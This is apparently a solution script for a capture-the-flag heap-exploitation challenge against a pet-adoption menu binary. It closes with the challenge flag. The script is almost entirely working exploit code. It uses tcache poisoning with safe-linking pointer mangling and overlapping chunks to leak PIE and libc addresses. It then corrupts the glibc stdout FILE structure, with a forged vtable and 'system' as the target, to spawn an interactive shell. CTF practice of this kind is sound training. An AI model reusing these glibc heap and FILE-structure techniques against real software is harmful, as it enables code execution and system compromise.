#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./learning_oop_patched', checksec=False)
libc = exe.libc

ru = lambda a: p.recvuntil(a)
lleak = lambda a, b: log.info(a + " = %#x" % b)

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500
# brva 0x1408
brva 0x15D1
brva 0x1605
brva 0x1639
brva 0x166A
# b *update
brva 0x1B28
brva 0x1811
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]), ssl=True)
    return p

def adopt(pet_type: int, name: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Choose pet species (1=Dog, 2=Cat, 3=Parrot, 4=Horse): ', f"{pet_type}".encode())
    p.sendlineafter(b'Enter name: ', name)


def play(pet_index: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Which pet? ', f"{pet_index}".encode())


def feed(pet_index: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Which pet? ', f"{pet_index}".encode())


def rest(pet_index: int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Which pet? ', f"{pet_index}".encode())

# ==================== EXPLOIT ====================
p = start()

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

adopt(1, b"0" * 0x100 + p32(0) + p32(3))
ru(b"Adopted new pet: ")
heap = int(p.recvline(), 16)
slog('heap @ %#x', heap)

adopt(1, b"1" * 0x100 + p32(0) + p32(3))
adopt(1, b"2" * 0x100 + p32(0) + p32(1))

sla(b"> ", b"6")

# tcache poisoning
mangle = (heap + 0x340) ^ (heap + 0x240) >> 12
adopt(1,  b"3" * 0x100 + p32(0) + p32(0x6) + \
                            p64(3) + p64(0x121) + p64(mangle))
adopt(1, b"4" * 0x100 + p32(0) + p32(0x2))


# overlap chunk
adopt(1, b"5" * 0x100 + p32(0) + p32(0x2) + \
                            b"5" * (0x2f0 - 0x110) + \
                                            p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21))

# leak pie
ru(b"4" * 0xf8)
pie = u64(rb(6).ljust(8, b"\x00")) - 0x4c98
slog('pie base @ %#x', pie)

# set up
adopt(1, b"6" * 0xf0 + p64(0x121) + p64(pie + 0x4c98) + p32(0) + p32(0x2))

sla(b"> ", b"6")
sla(b"> ", b"6")


# tcache poisoning
mangle = (heap) ^ (heap + 0x120) >> 12
adopt(1, b"7" * 0x100 + p32(0) + p32(0x3) + \
                            p64(3) + p64(0x121) + p64(mangle))
adopt(1, b"8" * 0x100)

# make fake unsortedbin
adopt(1, b"9" * 0x100 + p32(0) + p32(5) + \
                                p64(3) + p64(0x521)[:7])

# last remainder
adopt(1, b"A" * 0x100 + p32(0) + p32(2) + \
                                p64(3) + p64(0x401) + p64(pie + 0x4c98)[:7])

# leak libc
sla(b"> ", b"3")
ru(b"A" * 0x100)
ru(b"1. ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
slog('libc base @ %#x', libc_base)
sla(b"pet? \n", b"1")

sla(b"> ", b"6")

adopt(1, b"B" * 0x100 + p32(0) + p32(0x13) + \
                                p64(3) + p64(0x121)[:7])

for i in range(18):
	sla(b"> ", b"6")


# tcache poisioning
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
mangle = (_IO_2_1_stdout_ - 0x120) ^ (heap + 0x240) >> 12
adopt(1, b"C" * 0x100 + p32(0) + p32(5) + p64(3) + p64(0x121) + p64(mangle))
adopt(1, b"D" * 0x10)

system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

adopt(1, b"E" * 0x100 + p32(0) + p32(5) + p64(3) + b"E" * 8 + payload)

interactive()
# SEKAI{WOw11!1!Iii_UM4Z1NG_3xpl0it_sk1llz!!!!}
